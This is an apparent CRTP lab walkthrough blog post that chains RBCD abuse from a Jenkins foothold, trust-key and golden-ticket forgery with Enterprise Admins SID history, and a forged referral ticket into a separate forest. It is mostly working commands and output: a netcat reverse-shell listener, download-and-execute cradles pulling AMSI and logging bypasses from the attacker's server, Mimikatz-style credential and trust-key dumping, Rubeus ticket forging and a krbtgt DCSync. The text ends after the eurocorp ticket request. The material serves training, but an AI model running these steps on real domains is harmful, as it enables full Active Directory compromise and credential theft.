---
title: "CRTP Deep Dive: RBCD Abuse from Jenkins + Cross-Forest Trust Escalation to Enterprise Admins"
date: 2026-04-10 15:00:00 +0200
categories: [Red Team, CRTP]
tags: [rbcd, cross-forest, trust-key, enterprise-admins, golden-ticket, silver-ticket, sid-history, active-directory, windows, crtp]
description: "A step-by-step guide covering RBCD exploitation from a Jenkins foothold, escalating to Enterprise Admins using domain trust keys and krbtgt hashes, and accessing cross-forest resources in eurocorp — all PowerShell-based CRTP lab walkthrough."
pin: true
math: true
mermaid: true
---

## Introduction

This post covers three CRTP learning objectives that represent the full attack chain from a Jenkins foothold to cross-forest resource access:

1. **RBCD from Jenkins** — exploiting Write permissions via a reverse shell to access `dcorp-mgmt` as Domain Admin
2. **Enterprise Admins via Trust Key** — extracting the inter-realm trust key and forging a ticket with SID History to become Enterprise Admin
3. **Enterprise Admins via krbtgt** — using `dcorp`'s krbtgt hash to forge a Golden Ticket that crosses into `moneycorp`
4. **Cross-Forest Access** — accessing `eurocorp.local` resources by forging a referral ticket (SID filtering applies)

> All commands are **PowerShell / Windows-based only**, as used in CRTP labs.
{: .prompt-info }

---

## The Lab Environment

```
┌──────────────────────────────────────────────────────────────────┐
│                     CRTP LAB TOPOLOGY                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│   MONEYCORP.LOCAL (Parent Forest Root)                          │
│   ┌──────────────────────────────────────┐                       │
│   │  mcorp-dc.moneycorp.local            │                       │
│   │  (Enterprise Admins live here)        │                       │
│   └──────────────┬───────────────────────┘                       │
│                  │ Parent-Child Trust                            │
│   DOLLARCORP.MONEYCORP.LOCAL (Child Domain)                     │
│   ┌─────────────────────────────────────────────────────────┐    │
│   │  dcorp-dc         — Domain Controller                    │    │
│   │  dcorp-appsrv     — Unconstrained Delegation server      │    │
│   │  dcorp-ci         — Jenkins CI server (foothold!)         │    │
│   │  dcorp-mgmt       — Target (Write via ciadmin)            │    │
│   │  dcorp-studentX   — Attacker student VM                  │    │
│   └─────────────────────────────────────────────────────────┘    │
│                  │ External/Forest Trust                         │
│   EUROCORP.LOCAL (Separate Forest)                              │
│   ┌──────────────────────────────────────┐                       │
│   │  eurocorp-dc.eurocorp.local          │                       │
│   │  SharedwithDCorp — shared resource   │                       │
│   └──────────────────────────────────────┘                       │
│                                                                  │
│  TRUST TYPES:                                                    │
│  dcorp → mcorp : Parent-Child (implicit 2-way, full SID filter) │
│  dcorp → ecorp : External Trust (SID Filtering enforced!        │
│                  SID History blocked!)                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Learning Objective 17: RBCD Abuse from Jenkins Foothold

### The Attack Path

```
┌──────────────────────────────────────────────────────────────────┐
│              RBCD FROM JENKINS — FULL ATTACK PATH                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────┐                                         │
│  │  Jenkins (dcorp-ci) │ ← We already have a reverse shell here  │
│  │  Running as ciadmin │   via a Jenkins pipeline job            │
│  └──────────┬──────────┘                                         │
│             │                                                    │
│             │ ciadmin has GenericWrite on dcorp-mgmt             │
│             ▼                                                    │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Step 1: Load tools via the reverse shell                 │    │
│  │         Load AMSI bypass + sblogging bypass + PowerView  │    │
│  └────────────────────┬─────────────────────────────────────┘    │
│                       │                                          │
│                       ▼                                          │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Step 2: Set RBCD on dcorp-mgmt                           │    │
│  │         Allow dcorp-studentX$ to delegate to dcorp-mgmt  │    │
│  └────────────────────┬─────────────────────────────────────┘    │
│                       │                                          │
│                       ▼                                          │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Step 3: Extract AES keys of dcorp-studentX$              │    │
│  │         From our own student machine (admin access)       │    │
│  └────────────────────┬─────────────────────────────────────┘    │
│                       │                                          │
│                       ▼                                          │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Step 4: Rubeus S4U — impersonate Administrator           │    │
│  │         Request http/dcorp-mgmt ticket as Administrator   │    │
│  └────────────────────┬─────────────────────────────────────┘    │
│                       │                                          │
│                       ▼                                          │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Step 5: winrs -r:dcorp-mgmt cmd                          │    │
│  │         Shell on dcorp-mgmt as Administrator!            │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Enumerate Write Permissions (from Student VM)

```powershell
# ============================================================
# From dcorp-studentX (with Invisi-Shell active)
# Find which user has Write permissions on computer objects
# ============================================================

. C:\AD\Tools\PowerView.ps1

# Find interesting ACLs across the domain
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

#### Example Output

```
ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user

[+] ciadmin has GenericWrite on DCORP-MGMT!
```

> `GenericWrite` on a computer object is all you need to set `msDS-AllowedToActOnBehalfOfOtherIdentity` — the RBCD attribute.
{: .prompt-info }

### Step 2: Set Up Listener and Catch the Reverse Shell

```powershell
# ============================================================
# On student VM — set up netcat listener
# (ciadmin shell comes from Jenkins pipeline job we set up earlier)
# ============================================================

C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
# listening on [any] 443 ...
# connect to [172.16.100.1] from (UNKNOWN) [172.16.3.11] 51192
```

### Step 3: Load Tools via the Jenkins Reverse Shell

```powershell
# ============================================================
# IN THE REVERSE SHELL (running as ciadmin on dcorp-ci)
# Load bypass and PowerView from our attacker HTTP server
# ============================================================

# Bypass Script Block Logging
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')

# Bypass AMSI
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')

# Load PowerView
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

### Step 4: Configure RBCD on dcorp-mgmt

```powershell
# ============================================================
# IN THE REVERSE SHELL (as ciadmin on dcorp-ci)
# Configure RBCD — allow dcorp-studentX$ to delegate to dcorp-mgmt
# ============================================================

# Set RBCD using PowerView's Set-DomainRBCD
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

#### Expected Output

```
VERBOSE: [Get-DomainObject] Searching for computer 'dcorp-mgmt'
VERBOSE: [Get-DomainObject] Found DCORP-MGMT
VERBOSE: [Set-DomainRBCD] Setting msDS-AllowedToActOnBehalfOfOtherIdentity
VERBOSE: [Set-DomainRBCD] Delegating from dcorp-studentx$ to dcorp-mgmt
VERBOSE: [Set-DomainRBCD] Done.
```

```powershell
# ============================================================
# VERIFY RBCD IS CONFIGURED CORRECTLY
# ============================================================

Get-DomainRBCD
```

#### Verification Output

```
SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local,
                              TERMSRV/DCORP-MGMT, TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-studentx$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-4110
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-studentx,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local

[+] RBCD is configured! dcorp-studentx$ can now delegate to dcorp-mgmt.
```

### Step 5: Extract AES Keys of Your Student VM

```powershell
# ============================================================
# ON STUDENT VM — elevated command prompt
# Extract the machine account's AES keys
# ============================================================

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

#### Example Output

```
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STUDENTX$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/3/2023 2:56:13 AM
SID               : S-1-5-18

         * Username : dcorp-studentX$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb
           rc4_hmac_nt       db29067123dbc940194569f171d7034d
           rc4_hmac_old      db29067123dbc940194569f171d7034d
           rc4_md4           db29067123dbc940194569f171d7034d
           rc4_hmac_nt_exp   db29067123dbc940194569f171d7034d
           rc4_hmac_old_exp  db29067123dbc940194569f171d7034d
```

> Copy the `aes256_hmac` value — this is what you'll use with Rubeus for the best OPSEC.
{: .prompt-tip }

### Step 6: Rubeus S4U — Access dcorp-mgmt as Administrator

```powershell
# ============================================================
# ON STUDENT VM — elevated command prompt
# Abuse RBCD to get a ticket to http/dcorp-mgmt as Administrator
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentx$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

#### Example Output

```
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-studentx$'
[+] TGT request successful!

[*] Action: S4U2self
[*] Building S4U2self request for: 'dcorp-studentx$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Impersonating user 'administrator' to self
[+] S4U2self success!

[*] Action: S4U2proxy
[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[+] S4U2proxy success!

[*] Action: Import Ticket
[+] Ticket successfully imported!

  ServiceName              :  http/dcorp-mgmt
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 3:00:00 PM
  EndTime                  :  4/11/2026 1:00:00 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
```

### Step 7: Get Shell on dcorp-mgmt

```powershell
# ============================================================
# ON STUDENT VM — verify access
# ============================================================

winrs -r:dcorp-mgmt cmd
```

#### Example Output

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp> set username
USERNAME=administrator

C:\Users\Administrator.dcorp> set computername
COMPUTERNAME=DCORP-MGMT

[+] Shell on dcorp-mgmt as Administrator!
```

---

## Learning Objective 18: Escalate to Enterprise Admins via Trust Key

### Understanding Domain Trusts

```
┌──────────────────────────────────────────────────────────────────┐
│           PARENT-CHILD TRUST — KEY CONCEPTS                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  DOLLARCORP.MONEYCORP.LOCAL (child)                              │
│           │                                                      │
│           │  Parent-Child Trust                                  │
│           │  (2-way, transitive)                                 │
│           │                                                      │
│  MONEYCORP.LOCAL (parent / forest root)                          │
│                                                                  │
│  HOW CROSS-DOMAIN TICKETS WORK:                                  │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ 1. User in dcorp requests access to mcorp resource       │    │
│  │ 2. dcorp KDC issues a referral TGT (inter-realm ticket)  │    │
│  │    encrypted with the TRUST KEY                          │    │
│  │ 3. User presents referral TGT to mcorp KDC               │    │
│  │ 4. mcorp KDC issues a TGS for the requested service      │    │
│  │ 5. User accesses the resource                            │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ATTACKER ABUSE:                                                 │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ If we have the TRUST KEY (shared between dcorp & mcorp): │    │
│  │ → We can FORGE a referral TGT ourselves                  │    │
│  │ → Add SID History of Enterprise Admins (519)             │    │
│  │ → mcorp KDC accepts it — thinks dcorp issued it          │    │
│  │ → We get a TGS as Enterprise Admin to ANY mcorp service  │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  SID HISTORY ABUSE:                                              │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ Enterprise Admins SID: S-1-5-21-<mcorp>-519              │    │
│  │                                                          │    │
│  │ By embedding this SID in the ExtraSIDs field of our      │    │
│  │ forged inter-realm TGT, mcorp treats us as Enterprise    │    │
│  │ Admin — full control of the forest!                      │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Get DA Access First (OPTH as svcadmin)

```powershell
# ============================================================
# ON STUDENT VM — elevated command prompt
# Start a process with DA privileges using svcadmin's AES key
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Example Output

```
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[+] TGT request successful!

[*] Action: Create Process (/netonly)
[+] Process 'C:\Windows\System32\cmd.exe' successfully created with LUID
[+] Ticket successfully imported into new process!

★ A new cmd.exe window opens with svcadmin's (Domain Admin) TGT!
```

### Step 2: Copy Loader.exe to DC and Set Up Port Proxy

```powershell
# ============================================================
# IN THE NEW cmd.exe (running as DA / svcadmin)
# Copy Loader.exe to the DC and pivot through it
# ============================================================

# Copy Loader.exe to dcorp-dc's public folder
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

#### Example Output

```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

```powershell
# ============================================================
# OPEN A SHELL ON dcorp-dc
# ============================================================

winrs -r:dcorp-dc cmd
```

```powershell
# ============================================================
# ON dcorp-dc
# Set up port proxy so it can reach our HTTP server
# (dcorp-dc can't reach attacker directly, so we proxy through it)
# ============================================================

# Forward requests on port 8080 to our HTTP server on port 80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

### Step 3: Extract the Trust Key from dcorp-dc

```powershell
# ============================================================
# ON dcorp-dc
# Use Loader + SafetyKatz to dump the inter-realm trust keys
# The trust key is stored in the LSA Secrets of the DC
# ============================================================

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

#### Example Output

```
mimikatz # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 2/24/2023 1:11:33 AM - CLEAR   - 79 d9 90 1f 7c db 09 b7 65 a0 e5 e4 50 03 35...
        * aes256_hmac       34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
        * aes128_hmac       40856eb80d3323adf23a3b7faad3c180
        * rc4_hmac_nt       132f54e05f7c3db02e97c00ff3879067
```

> The `rc4_hmac_nt` value is the **inter-realm trust key**. It is shared between the two DCs for ticket encryption — extracting it from dcorp-dc gives us everything we need.
{: .prompt-info }

### Step 4: Forge an Inter-Realm Ticket with EA SID History

```powershell
# ============================================================
# ON STUDENT VM
# Forge a referral ticket (inter-realm TGT) with SID History
# of Enterprise Admins (519) embedded
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

#### Understanding the Parameters

```
┌──────────────────────────────────────────────────────────────────┐
│           RUBEUS EVASIVE-SILVER — PARAMETER BREAKDOWN            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL                      │
│  → Service for the inter-realm TGT (targeting the trust)         │
│                                                                  │
│  /rc4:132f54e05f7c3db02e97c00ff3879067                          │
│  → The trust key (RC4/NTLM) extracted from the DC                │
│                                                                  │
│  /sid:S-1-5-21-719815819-3726368948-3917688648                   │
│  → SID of the SOURCE domain (dollarcorp)                         │
│                                                                  │
│  /sids:S-1-5-21-335606122-960912869-3279953914-519               │
│  → ★ SID History to inject!                                     │
│  → S-1-5-21-<mcorp SID>-519 = Enterprise Admins of moneycorp    │
│  → mcorp-dc sees this user as Enterprise Admin!                  │
│                                                                  │
│  /ldap                                                           │
│  → Pull group info from LDAP to build a realistic PAC            │
│                                                                  │
│  /user:Administrator                                             │
│  → The username for the forged ticket                            │
│                                                                  │
│  /nowrap                                                         │
│  → Output base64 ticket without line wrapping                    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Example Output

```
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[*] ServiceKey     : 132f54e05f7c3db02e97c00ff3879067 (rc4_hmac)
[*] Service        : krbtgt
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] base64(ticket.kirbi):

      doIGPjCCBjqgAwIBBaEDAgEWooIEmzCCBJdhggSTMIIEj6ADAgEFo...
      [SNIP — copy this entire base64 string]
```

### Step 5: Request TGS for mcorp-dc Using the Forged Ticket

```powershell
# ============================================================
# ON STUDENT VM
# Use the forged inter-realm TGT to request a TGS for
# http/mcorp-dc.MONEYCORP.LOCAL
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```

#### Example Output

```
[*] Action: Ask TGS

[*] Using the cross-realm TGT for mcorp-dc.MONEYCORP.LOCAL
[*] Building TGS-REQ for: 'http/mcorp-dc.MONEYCORP.LOCAL'
[*] Using domain controller: mcorp-dc.MONEYCORP.LOCAL

[+] TGS request successful!

[+] Ticket successfully imported!

  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 3:10:00 PM
  EndTime                  :  4/11/2026 1:10:00 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
```

### Step 6: Access mcorp-dc!

```powershell
# ============================================================
# Verify access to mcorp-dc as Enterprise Admin
# ============================================================

winrs -r:mcorp-dc.moneycorp.local cmd
```

#### Example Output

```
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
USERNAME=Administrator

C:\Users\TEMP> set computername
COMPUTERNAME=MCORP-DC

[+] We are on the PARENT DOMAIN CONTROLLER as Administrator!
[+] Enterprise Admin level access achieved!
```

---

## Learning Objective 19: Enterprise Admins via krbtgt Hash (Golden Ticket)

### Why This Works

```
┌──────────────────────────────────────────────────────────────────┐
│      GOLDEN TICKET → CROSS-DOMAIN (Inter-Realm TGT)             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  The dcorp krbtgt hash can sign/encrypt ANY ticket               │
│  including inter-realm TGTs (referral tickets).                  │
│                                                                  │
│  By creating a Golden Ticket (TGT) for dcorp that includes:      │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ • User: Administrator (RID 500)                         │     │
│  │ • Domain: dollarcorp.moneycorp.local                    │     │
│  │ • SID: dcorp SID                                        │     │
│  │ • ExtraSIDs: mcorp Enterprise Admins (519) ← KEY!       │     │
│  │ • Encrypted with: dcorp krbtgt AES256 key               │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
│  When we request access to mcorp resources:                      │
│  1. dcorp KDC sees our Golden TGT and issues referral ticket     │
│  2. mcorp KDC receives referral — checks SID History             │
│  3. Sees EA SID (519) in ExtraSIDs — grants EA access!           │
│                                                                  │
│  Trust Key Method vs Golden Ticket Method:                       │
│  ┌────────────────────┬──────────────────────────────────┐       │
│  │ Trust Key Method   │ Golden Ticket Method             │       │
│  ├────────────────────┼──────────────────────────────────┤       │
│  │ Uses trust key     │ Uses krbtgt hash                 │       │
│  │ (shared secret)    │ (only on DC)                     │       │
│  │ Forges referral    │ Forges full TGT that generates   │       │
│  │ TGT directly        │ referral automatically            │       │
│  │ Must know mcorp SID│ Must know mcorp SID               │       │
│  │ Result: same EA    │ Result: same EA access            │       │
│  │ access             │                                  │       │
│  └────────────────────┴──────────────────────────────────┘       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Forge the Golden Ticket with ExtraSIDs

```powershell
# ============================================================
# ON STUDENT VM — elevated command prompt
# Create a Golden Ticket with Enterprise Admins SID History
# We already have the krbtgt AES256 key from previous DCSync
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

#### Understanding the Parameters

```
┌──────────────────────────────────────────────────────────────────┐
│           RUBEUS EVASIVE-GOLDEN — PARAMETER BREAKDOWN            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  /user:Administrator                                             │
│  → Username to embed in the Golden Ticket                        │
│                                                                  │
│  /id:500                                                         │
│  → RID of Administrator account                                  │
│                                                                  │
│  /domain:dollarcorp.moneycorp.local                              │
│  → Domain of the Golden Ticket (our domain)                      │
│                                                                  │
│  /sid:S-1-5-21-719815819-3726368948-3917688648                   │
│  → SID of dollarcorp (our source domain)                         │
│                                                                  │
│  /sids:S-1-5-21-335606122-960912869-3279953914-519               │
│  → ★ SID History: mcorp Enterprise Admins (RID 519)             │
│  → This is what makes it cross-forest-capable                    │
│                                                                  │
│  /aes256:154cb6624b1...                                          │
│  → dcorp krbtgt AES256 key (from our earlier DCSync)             │
│                                                                  │
│  /netbios:dcorp                                                  │
│  → NetBIOS name of dollarcorp domain                             │
│                                                                  │
│  /ptt                                                            │
│  → Pass the ticket — inject into current session                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Example Output

```
[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[*] ServiceKey     : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 (aes256_cts_hmac_sha1)
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED

[+] Ticket successfully imported!
```

### Access mcorp-dc via Golden Ticket

```powershell
# ============================================================
# Verify access to mcorp-dc
# ============================================================

winrs -r:mcorp-dc.moneycorp.local cmd
```

#### Example Output

```
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
USERNAME=Administrator

C:\Users\TEMP> set computername
COMPUTERNAME=MCORP-DC
```

### Bonus: DCSync Against moneycorp

```powershell
# ============================================================
# IN THE mcorp-dc SHELL
# Run DCSync against moneycorp using our injected ticket
# ============================================================

C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

#### Example Output

```
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account

** SAM ACCOUNT **

SAM Username         : krbtgt
Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

[+] moneycorp krbtgt hash extracted! Full forest compromise achieved.
```

---

## Learning Objective 20: Cross-Forest Access to eurocorp.local

### Understanding External Trust vs Parent-Child

```
┌──────────────────────────────────────────────────────────────────┐
│     PARENT-CHILD vs EXTERNAL TRUST — KEY DIFFERENCE              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PARENT-CHILD (dcorp ↔ mcorp):                                   │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ • SID History IS respected across the trust             │     │
│  │ • ExtraSIDs containing EA group (519) WORK              │     │
│  │ • Full forest access possible!                          │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
│  EXTERNAL/FOREST TRUST (dcorp ↔ ecorp):                          │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ • SID FILTERING is enforced by default                  │     │
│  │ • ExtraSIDs containing foreign SIDs are STRIPPED        │     │
│  │ • You CANNOT inject ecorp EA SIDs                       │     │
│  │ • Access is LIMITED to explicitly shared resources       │     │
│  │ • Can access CIFS/SMB shares marked as accessible       │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
│  ★ For eurocorp, we forge a referral ticket WITHOUT              │
│    SID History — just as Administrator of dcorp.                 │
│    This gives access only to resources explicitly                │
│    shared with dollarcorp.                                       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Extract the eurocorp Trust Key

```powershell
# ============================================================
# ON dcorp-dc (using existing shell from previous objective)
# Dump trust keys — look for EUROCORP.LOCAL
# ============================================================

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

#### Example Output (eurocorp section)

```
mimikatz # lsadump::evasive-trust /patch

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 2/24/2023 1:10:52 AM - CLEAR   - 4b 28 69 61 81 ef 64 36 4e 80 d2 0a 54 63...
        * aes256_hmac       bc1e5642c1afebbeeb76b9ba6f688ea0c876ecac7ecdd4b7e95d5beb35d886df
        * aes128_hmac       9896c96f784de9a0341150b7fa1e2360
        * rc4_hmac_nt       163373571e6c3e09673010fd60accdf0
```

### Step 2: Forge a Referral Ticket (No SID History!)

```powershell
# ============================================================
# ON STUDENT VM
# Forge inter-realm referral ticket for eurocorp
# IMPORTANT: No /sids parameter — SID filtering blocks foreign SIDs
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:163373571e6c3e09673010fd60accdf0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

> Notice that there is **no** `/sids:` parameter here, unlike the mcorp attack. SID History is useless against external trusts — eurocorp would strip it out.
{: .prompt-warning }

#### Example Output

```
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : (none — SID filtering active on ecorp trust)

[*] base64(ticket.kirbi):

      doIGPjCCBjqgAwIBBaEDAgEWooIEmzCC...
      [SNIP — copy this entire base64 string]
```

### Step 3: Request TGS for CIFS on eurocorp-dc

```powershell
# ============================================================
# ON STUDENT VM
# Use the referral ticket to request CIFS access on eurocorp-dc
# ============================================================

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```

#### Example Output

```
[*] Action: Ask TGS

[*] Building TGS-REQ for: 'cifs/eurocorp-dc.eurocorp.LOCAL'
[*] Using domain controller: eurocorp-dc.eurocorp.LOCAL

[+] TGS request successful!
[+] Ticket successfully imported!

  ServiceName              :  CIFS/eurocorp-dc.eurocorp.LOCAL
  ServiceRealm             :  EUROCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
```

